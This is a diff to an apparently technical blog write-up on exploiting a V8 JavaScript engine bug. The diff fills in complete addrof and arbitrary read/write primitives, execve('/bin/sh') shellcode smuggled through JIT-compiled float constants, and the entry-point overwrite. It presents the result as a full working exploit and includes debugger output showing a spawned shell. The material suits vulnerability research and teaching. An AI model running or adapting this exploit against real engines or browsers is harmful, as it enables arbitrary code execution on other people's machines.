@@ -174,24 +174,28 @@ SimpleInstallFunction(isolate_, proto, &amp;#34;shift&amp;#34;,
 &lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* create an oob array */&lt;/span>
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
 &lt;span style="color:#a6e22e">oob&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
-&lt;span style="color:#75715e">/* flt.elements @ oob[] */&lt;/span>
-&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#ae81ff">1.1&lt;/span>];
-&lt;span style="color:#75715e">/* obj.elements @ oob[] */&lt;/span>
+&lt;span style="color:#75715e">/* flt.elements @ oob[6] */&lt;/span>
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
+&lt;span style="color:#75715e">/* obj.elements @ oob[15] */&lt;/span>
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>};
-&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>[&lt;span style="color:#a6e22e">tmp&lt;/span>];
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#a6e22e">tmp&lt;/span>];
 &lt;span style="color:#75715e">/* addrof primitive */&lt;/span>
 &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) {
-&lt;span style="color:#75715e">// ...
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
+&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">15&lt;/span>];
+&lt;span style="color:#a6e22e">obj&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>;
+&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
+}
 &lt;span style="color:#75715e">/* 64-bit read primitive */&lt;/span>
 &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>) {
-&lt;span style="color:#75715e">// ...
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]);
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>]) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
+&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>((&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
+&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]);
 }
 &lt;span style="color:#75715e">/* 64-bit write primitive */&lt;/span>
 &lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>, &lt;span style="color:#a6e22e">x&lt;/span>) {
-&lt;span style="color:#75715e">// ...
-&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>);
+&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>]) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
+&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>((&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
+&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>);
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="33-redirecting-code-execution">3.3. Redirecting Code Execution&lt;/h3>
 &lt;p>Now we can finally move on to the interesting part! How, given that we are in this heap sandbox, can we redirect code execution? Not necessarily to a place we control, but just to any arbitrary location.&lt;/p>
@@ -308,23 +312,28 @@ pwndbg&amp;gt; x/40i 0x55cdc0004040
 &lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
 &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">convert&lt;/span>(x):
+print(len(x))
 jmp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\xeb\x0c&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># jmp 0xe&lt;/span>
 &lt;span style="color:#66d9ef">return&lt;/span> u64(x&lt;span style="color:#f92672">.&lt;/span>ljust(&lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x90&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> jmp)
 imm &lt;span style="color:#f92672">=&lt;/span> [
 asm(&lt;span style="color:#e6db74">&amp;#39;push SYS_execve; pop rax&amp;#39;&lt;/span>),
-asm(&lt;span style="color:#e6db74">&amp;#39;push 0x0068732f&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># push &amp;#34;/sh\0&amp;#34;&lt;/span>
-asm(&lt;span style="color:#e6db74">&amp;#39;push 0x6e69622f&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># push &amp;#34;/bin&amp;#34;&lt;/span>
+asm(&lt;span style="color:#e6db74">&amp;#39;push 0x0068732f; pop rbx&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># &amp;#34;/sh\0&amp;#34;&lt;/span>
+asm(&lt;span style="color:#e6db74">&amp;#39;push 0x6e69622f; pop rcx&amp;#39;&lt;/span>), &lt;span style="color:#75715e"># &amp;#34;/bin&amp;#34;&lt;/span>
+asm(&lt;span style="color:#e6db74">&amp;#39;shl rbx, 0x20&amp;#39;&lt;/span>),
+asm(&lt;span style="color:#e6db74">&amp;#39;add rbx, rcx; push rbx&amp;#39;&lt;/span>),
 asm(&lt;span style="color:#e6db74">&amp;#39;mov rdi, rsp&amp;#39;&lt;/span>),
 asm(&lt;span style="color:#e6db74">&amp;#39;xor rsi, rsi; xor rdx, rdx&amp;#39;&lt;/span>),
 asm(&lt;span style="color:#e6db74">&amp;#39;syscall&amp;#39;&lt;/span>)
 ]
 imm &lt;span style="color:#f92672">=&lt;/span> [convert(x) &lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> imm]
-print(imm)
+log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>imm&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
 &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;
 &lt;/span>&lt;span style="color:#e6db74">[
 &lt;/span>&lt;span style="color:#e6db74"> 930996698553531242,
-&lt;/span>&lt;span style="color:#e6db74"> 930996079408918376,
-&lt;/span>&lt;span style="color:#e6db74"> 930996551870984040,
+&lt;/span>&lt;span style="color:#e6db74"> 930937805292646248,
+&lt;/span>&lt;span style="color:#e6db74"> 930936078731456360,
+&lt;/span>&lt;span style="color:#e6db74"> 930996696683626824,
+&lt;/span>&lt;span style="color:#e6db74"> 930996697537642824,
 &lt;/span>&lt;span style="color:#e6db74"> 930996698562922824,
 &lt;/span>&lt;span style="color:#e6db74"> 931068857101463880,
 &lt;/span>&lt;span style="color:#e6db74"> 930996698557187343
@@ -341,8 +350,10 @@ print(imm)
 }
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [
 &lt;span style="color:#ae81ff">930996698553531242&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
-&lt;span style="color:#ae81ff">930996079408918376&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
-&lt;span style="color:#ae81ff">930996551870984040&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
+&lt;span style="color:#ae81ff">930937805292646248&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
+&lt;span style="color:#ae81ff">930936078731456360&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
+&lt;span style="color:#ae81ff">930996696683626824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
+&lt;span style="color:#ae81ff">930996697537642824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
 &lt;span style="color:#ae81ff">930996698562922824&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
 &lt;span style="color:#ae81ff">931068857101463880&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>,
 &lt;span style="color:#ae81ff">930996698557187343&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>
@@ -352,8 +363,10 @@ print(imm)
 &lt;span style="color:#75715e">/*
 &lt;/span>&lt;span style="color:#75715e">[
 &lt;/span>&lt;span style="color:#75715e"> 1.9711828979523134e-246,
-&lt;/span>&lt;span style="color:#75715e"> 1.9710255989867843e-246,
-&lt;/span>&lt;span style="color:#75715e"> 1.9711456320011017e-246,
+&lt;/span>&lt;span style="color:#75715e"> 1.9562205631094693e-246,
+&lt;/span>&lt;span style="color:#75715e"> 1.9557819155246427e-246,
+&lt;/span>&lt;span style="color:#75715e"> 1.9711824228871598e-246,
+&lt;/span>&lt;span style="color:#75715e"> 1.971182639857203e-246,
 &lt;/span>&lt;span style="color:#75715e"> 1.9711829003383248e-246,
 &lt;/span>&lt;span style="color:#75715e"> 1.9895153920223886e-246,
 &lt;/span>&lt;span style="color:#75715e"> 1.971182898881177e-246
@@ -366,8 +379,10 @@ print(imm)
 &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span> &lt;span style="color:#f92672">=&lt;/span> () =&amp;gt; {
 &lt;span style="color:#66d9ef">return&lt;/span> [
 &lt;span style="color:#ae81ff">1.9711828979523134&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
-&lt;span style="color:#ae81ff">1.9710255989867843&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
-&lt;span style="color:#ae81ff">1.9711456320011017&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
+&lt;span style="color:#ae81ff">1.9562205631094693&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
+&lt;span style="color:#ae81ff">1.9557819155246427&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
+&lt;span style="color:#ae81ff">1.9711824228871598&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
+&lt;span style="color:#ae81ff">1.971182639857203&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
 &lt;span style="color:#ae81ff">1.9711829003383248&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
 &lt;span style="color:#ae81ff">1.9895153920223886&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>,
 &lt;span style="color:#ae81ff">1.971182898881177&lt;/span>&lt;span style="color:#a6e22e">e&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">246&lt;/span>
@@ -431,7 +446,9 @@ Continuing.
 process 288620 is executing new program: /usr/bin/dash
 $ id
 &lt;/code>&lt;/pre>&lt;h3 id="36-building-an-exploit">3.6. Building an Exploit&lt;/h3>
-&lt;p>&amp;hellip;&lt;/p>
+&lt;p>At this point we have the majority of building blocks necessary to build a working exploit. The only missing component necessary to complete it is the part that overwrites the &lt;code>foo&lt;/code> function&amp;rsquo;s entry point.&lt;/p>
+&lt;p>This is fairly trivial to implement, we find the address of the &lt;code>foo&lt;/code> function using our addrof primtive, before reading the pointer to its code object (stored at an offset of 0x18) via our arbitrary read primitive.&lt;/p>
+&lt;p>We then use our arbitrary read primitive again, in order to find the pointer to the &lt;code>foo&lt;/code> function&amp;rsquo;s entry point (stored at an offset of 0xc). After this, we use our arbitrary write primitive to overwrite the entry point value to the start of our JITed shellcode.&lt;/p>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* get a pointer to the foo.code object */&lt;/span>
 &lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
 &lt;span style="color:#75715e">/* get the entry point of the compiled function */&lt;/span>
@@ -439,7 +456,7 @@ $ id
 &lt;span style="color:#75715e">/* overwrite the entry point with the start of the shellcode */&lt;/span>
 &lt;span style="color:#a6e22e">write&lt;/span>(&lt;span style="color:#a6e22e">code&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xc&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>, &lt;span style="color:#a6e22e">entry&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x69&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>);
 &lt;span style="color:#a6e22e">foo&lt;/span>();
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>&amp;hellip;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the code below you can find the whole working exploit code. Note that some of the offsets in the primitives have changed - this was due to the &lt;code>foo&lt;/code> function being placed above the arrays on the heap.
 &lt;div class="collapsable-code">
 &lt;input id="2" type="checkbox" checked />
 &lt;label for="2">
@@ -465,35 +482,41 @@ return fs[0];
 const foo = () =&amp;gt; {
 return [
 1.9711828979523134e-246,
-1.9710255989867843e-246,
-1.9711456320011017e-246,
+1.9562205631094693e-246,
+1.9557819155246427e-246,
+1.9711824228871598e-246,
+1.971182639857203e-246,
 1.9711829003383248e-246,
 1.9895153920223886e-246,
 1.971182898881177e-246
 ];
 }
-for (let i = 0; i &amp;lt; 0x10000; i&amp;#43;&amp;#43;)
+for (let i = 0; i &amp;lt; 0x40000; i&amp;#43;&amp;#43;)
 foo();
 /* create an oob array */
 let oob = [1.1];
 oob.len(1337);
-/* flt.elements @ oob[] */
-let flt = x[1.1];
-/* obj.elements @ oob[] */
+/* flt.elements @ oob[6] */
+let flt = [1.1];
+/* obj.elements @ oob[15] */
 let tmp = {a: 1};
-let obj = x[tmp];
+let obj = [tmp];
 /* addrof primitive */
 function addrof(o) {
-// ...
+oob[6] = oob[15];
+obj[0] = o;
+return (ftoi(flt[0]) &amp;amp; 0xffffffffn) - 1n;
 }
 /* 64-bit read primitive */
 function read(p) {
-// ...
+let a = ftoi(oob[6]) &amp;gt;&amp;gt; 32n;
+oob[6] = itof((a &amp;lt;&amp;lt; 32n) &amp;#43; p - 8n &amp;#43; 1n);
 return ftoi(flt[0]);
 }
 /* 64-bit write primitive */
 function write(p, x) {
-// ...
+let a = ftoi(oob[6]) &amp;gt;&amp;gt; 32n;
+oob[6] = itof((a &amp;lt;&amp;lt; 32n) &amp;#43; p - 8n &amp;#43; 1n);
 flt[0] = itof(x);
 }
 /* get a pointer to the foo.code object */
@@ -506,6 +529,9 @@ foo();
 &lt;/code>&lt;/pre>
 &lt;/div>
 &lt;/p>
+&lt;p>One last thing to note, while this exploit technique does seem fairly stable, different kernel versions or platforms will affect the offsets of the immediate numbers in the JIT compiled code.&lt;/p>
+&lt;p>This poses a slight problem as it significantly affects the reliability. Obviously techniques already exist to combat this issue - e.g. incrementing the offsets until the exploit executes successfully.&lt;/p>
+&lt;p>I do have some ideas I&amp;rsquo;d like to explore further around increasing exploit reliability - but those will come in another article.&lt;/p>
 &lt;h2 id="references">References&lt;/h2>
 &lt;ul>
 &lt;li>&lt;a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8">V8 Sandbox - High-Level Design Doc&lt;/a>&lt;/li>
